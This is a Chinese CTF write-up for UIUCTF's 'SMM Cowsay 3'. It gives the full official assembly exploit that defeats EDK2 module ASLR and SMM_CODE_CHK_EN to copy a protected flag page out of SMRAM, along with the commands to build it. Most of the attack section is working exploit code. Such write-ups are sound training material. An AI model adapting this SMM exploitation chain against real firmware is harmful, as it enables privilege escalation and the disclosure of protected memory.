# SMM Cowsay 3

## 题目简述

第三题保留 `SMM Cowsay 2` 的越界复制与函数指针覆写，同时加入两项防护：

1. EDK2 驱动按 10 位随机熵重新排列，`PiSmmIpl`、`PiSmmCpuDxeSmm` 等模块的绝对地址每次启动都会变化；
2. QEMU 与 OVMF 启用并锁定 `SMM_CODE_CHK_EN`，SMM 中只能执行 SMRR 所定义的 SMRAM 代码，不能再关闭分页后跳到普通 UEFI 缓冲区执行载荷。

flag 页 `0x44440000` 仍被标记为 read-protected，SMM 页表中的 Present 位被清除。攻击目标仍是用 409 字节通信数据覆写 `mDebugData.CowsayFunc`，但必须先动态求出模块基址，并让全部特权阶段都复用 SMRAM 内已有代码。

## 解题过程

### 从 UEFI 协议对象恢复两个随机基址

普通 UEFI 环境本身仍能访问 Boot Services。官方解法先调用 `LocateHandleBuffer(ByProtocol, gEfiLoadedImageProtocolGuid, ...)` 枚举所有已加载映像，再对每个 handle 调用 `HandleProtocol`。`EFI_LOADED_IMAGE_PROTOCOL` 中：

```text
FilePath offset  = 32
ImageBase offset = 64
```

比较 `FilePath` 中 firmware-volume 节点的 `FvFileName` GUID，找到 GUID 为 `2fa2a6da-11d5-4dc3-999a-749648b03c56` 的 `PiSmmIpl`，即可从 `ImageBase` 得到其随机基址。加上符号偏移 `mSmmCorePrivateData=0x7140` 后，就能继续设置 SMM 通信缓冲区。

第二个基址通过 `LocateProtocol(gEfiSmmConfigurationProtocolGuid)` 获得。返回的 protocol 对象位于 `PiSmmCpuDxeSmm` 的全局 `mSmmCpuPrivateData.SmmConfiguration` 中，因此按调试符号给出的两层偏移回退：

```text
PiSmmCpuDxeSmm base
  = protocol_pointer
  - SMM_CPU_PRIVATE_DATA.SmmConfiguration (112)
  - mSmmCpuPrivateData (0x161a0)
```

这样无需爆破 10 位 ASLR，也无需从 SMM 内向外泄露地址。

### 仍用 LongJump 上下文关闭分页

越界布局与第二题相同：400 字节覆盖 `Message`，随后 8 字节把函数指针改为本次随机基址下的 `CetDone`，再写一个零字节保持 `Icebp=0`，但不触及偏移 416 的 Canary。

`CetDone` 从通信数据恢复寄存器。仍令 `RBX=0x00010033`，并把最终跳转地址设为 `Base+25`，从而执行 `mov cr0,rbx; retf`，关闭分页并切换到 `CS=0x8` 的 32 位保护模式。区别在于 `SMM_CODE_CHK_EN` 已禁止从 SMRAM 跳向普通缓冲区，所以 32 位目标必须仍位于 `PiSmmCpuDxeSmm` 的可执行区。

### 把 64 位 CopyBytes 片段重解释成 32 位 gadget

模块中的 `CopyBytes` 尾部原本是 64 位代码：

```asm
CopyBytes:
    mov rcx, r8      ; 4c 89 c1
    rep movsb
    cld
    pop rdi
    pop rsi
    ret
```

从 `CopyBytes+1` 开始并在 32 位模式解释时，`89 c1` 变为 `mov ecx,eax`。`CetDone` 在跳转前执行 `mov rax,rdx`，而 `RDX` 恰好是被覆写函数指针的第二个参数 `TempCommBufferSize`，所以 `EAX` 已含可用复制长度。伪造上下文再令：

```text
ESI = 0x44440000     # flag 物理源地址
EDI = buffer_end     # 普通世界可读写目的地址
EAX = MessageLength  # 由调用约定自然保留
```

`rep movsb` 便把 flag 页内容复制到 SMRAM 外。随后的两个 `pop` 从受控栈取填充值，`ret` 跳到同一 SMM 模块内的 `rsm` 指令。`RSM` 恢复进入 SMI 前的普通 UEFI 状态；shellcode 从 `fin_smi` 继续运行，再把 `buffer_end` 中的字符串写到串口 `0x3f8`。整个 SMM 阶段从未执行 SMRAM 外代码，因而没有违反 `SMM_CODE_CHK_EN`。

### 官方解题代码

下面是去掉许可证注释后的官方 `solution.S`。所有数值都是符号偏移，只有 `PiSmmIpl` 与 `PiSmmCpuDxeSmm` 基址在运行时求出：

```asm
.globl _start

mSmmCorePrivateData = 0x7140
CommunicationBuffer = 56
BufferSize = 64

BootServices = 96
AllocatePool = 64
HandleProtocol = 152
LocateHandleBuffer = 312
LocateProtocol = 320

FilePath = 32
ImageBase = 64
FvFileName = 4
SmmConfiguration = 112

EfiRuntimeServicesData = 6
ByProtocol = 2

CetDone = 0x108f0
Base = 0x1028a
mSmmCpuPrivateData = 0x161a0
CopyBytes = 0x10853
GAD_rsm = 0x10139

_start:
  mov %rsp,%rbp
  and $-16,%rsp

  mov $ByProtocol,%rcx
  lea gEfiLoadedImageProtocolGuid(%rip),%rdx
  mov $0,%r8
  lea HandleBufferSize(%rip),%r9
  lea HandleBuffer(%rip),%rax
  push %rax
  sub $32,%rsp
  mov BootServices(%rbx),%rax
  call *LocateHandleBuffer(%rax)
  test %rax,%rax
  jne bad

  xor %r12,%r12
find_loop:
  cmp %r12,HandleBufferSize(%rip)
  je bad

  mov HandleBuffer(%rip),%rcx
  mov (%rcx,%r12,8),%rcx
  lea gEfiLoadedImageProtocolGuid(%rip),%rdx
  lea LoadedImage(%rip),%r8
  mov BootServices(%rbx),%rax
  call *HandleProtocol(%rax)
  test %rax,%rax
  jne bad

  mov LoadedImage(%rip),%rax
  mov FilePath(%rax),%rax
  lea FvFileName(%rax),%rsi
  lea PiSmmIplGuid(%rip),%rdi
  mov $16,%rcx
  repe cmpsb
  jz find_loop_done
  inc %r12
  jmp find_loop

find_loop_done:
  mov LoadedImage(%rip),%r13
  mov ImageBase(%r13),%r13
  lea mSmmCorePrivateData(%r13),%r13

  lea gEfiSmmConfigurationProtocolGuid(%rip),%rcx
  mov $0,%rdx
  lea mSmmConfiguration(%rip),%r8
  mov BootServices(%rbx),%rax
  call *LocateProtocol(%rax)
  test %rax,%rax
  jne bad

  mov mSmmConfiguration(%rip),%r14
  lea -SmmConfiguration(%r14),%r14
  lea -mSmmCpuPrivateData(%r14),%r14

  lea ropchain(%rip),%rax
  mov %rax,fill_ropchain(%rip)
  lea buffer_end(%rip),%rax
  mov %rax,fill_buffer_end(%rip)
  lea Base(%r14),%rax
  lea 25(%rax),%rax
  mov %rax,fill_base(%rip)
  lea CetDone(%r14),%rax
  mov %rax,fill_cetdone(%rip)
  lea CopyBytes+1(%r14),%rax
  mov %eax,fill_copybytes(%rip)
  lea GAD_rsm(%r14),%rax
  mov %eax,fill_rsm(%rip)

  mov $EfiRuntimeServicesData,%rcx
  mov $(buffer_end-buffer),%rdx
  lea buffer_send(%rip),%r8
  mov BootServices(%rbx),%rax
  call *AllocatePool(%rax)
  test %rax,%rax
  jne bad

  lea buffer(%rip),%rsi
  mov buffer_send(%rip),%rdi
  mov $(buffer_end-buffer),%rcx
  rep movsb

  mov buffer_send(%rip),%rax
  movq %rax,CommunicationBuffer(%r13)
  movq $(buffer_end-buffer),BufferSize(%r13)
  xor %eax,%eax
  outb %al,$0xB3
  outb %al,$0xB2
  jmp fin_smi

fin_smi:
  lea buffer_end(%rip),%esi
  mov $0x3f8,%dx
print_loop:
  lodsb
  outb %al,(%dx)
  test %al,%al
  jz print_done
  jmp print_loop
print_done:
  mov %rbp,%rsp
  ret

bad:
  hlt
  jmp bad

buffer_send:      .quad 0
HandleBufferSize: .quad 0
HandleBuffer:     .quad 0
LoadedImage:      .quad 0
mSmmConfiguration:.quad 0

gEfiLoadedImageProtocolGuid:
  .long 0x5B1B31A1
  .short 0x9562
  .short 0x11D2
  .byte 0x8E,0x3F,0x00,0xA0,0xC9,0x69,0x72,0x3B

PiSmmIplGuid:
  .long 0x2FA2A6DA
  .short 0x11D5
  .short 0x4dc3
  .byte 0x99,0x9A,0x74,0x96,0x48,0xB0,0x3C,0x56

gEfiSmmConfigurationProtocolGuid:
  .long 0x26eeb3de
  .short 0xb689
  .short 0x492e
  .byte 0x80,0xf0,0xbe,0x8b,0xd7,0xda,0x4b,0xa7

buffer:
  .long 0x9a75cf12
  .short 0x2c83
  .short 0x4d10
  .byte 0xb5,0xa8,0x35,0x75,0x54,0x65,0x92,0xf7
  .quad buffer_end-message

message:
  .quad 0x0000000080010033 & ~0x80000000
fill_ropchain:
  .quad -1
  .quad 0
fill_buffer_end:
  .quad -1
  .quad 0x44440000
  .quad 0
  .quad 0
  .quad 0
  .quad 0
fill_base:
  .quad -1

ropchain:
fill_copybytes:
  .long -1
  .long 0x8
  .long -1
  .long -1
fill_rsm:
  .long -1

  .rept 400 - (. - message)
  .byte 0
  .endr

fill_cetdone:
  .quad -1
  .byte 0
buffer_end:
```

编译并提交方式与前两题相同：

```bash
gcc -static -nostartfiles solution.S -o solution.o
objcopy -j .text -O binary solution.o solution.bin
xxd -p solution.bin > solution.txt
```

发送十六进制文本并追加 `done` 后，普通 UEFI 阶段从复制出的缓冲区打印：

```text
uiuctf{uefi_is_hard_and_vendors_dont_care_1403c057}
```

## 方法总结

- 核心技巧：通过 UEFI 协议与 Loaded Image 元数据求出随机模块基址；复用 LongJump 和 SMM 入口片段切到无分页的 32 位模式；再把 SMRAM 内的 64 位复制代码错位解释成 32 位 gadget，将受保护物理页复制到普通内存。
- 识别信号：ASLR 只随机化装载地址，但协议对象仍保存真实指针；`SMM_CODE_CHK_EN` 只限制 SMM 执行位置，并不阻止合法 SMRAM 代码读写普通物理内存。
- 复用要点：防护组合必须逐项建模。关闭分页解决地址权限，却不能绕过代码范围检查；模块内 gadget 绕过代码范围检查，又必须先解决 ASLR。跨模式重解释指令时应逐字节核对编码、栈宽度、段选择子和 `RSM` 的恢复语义。
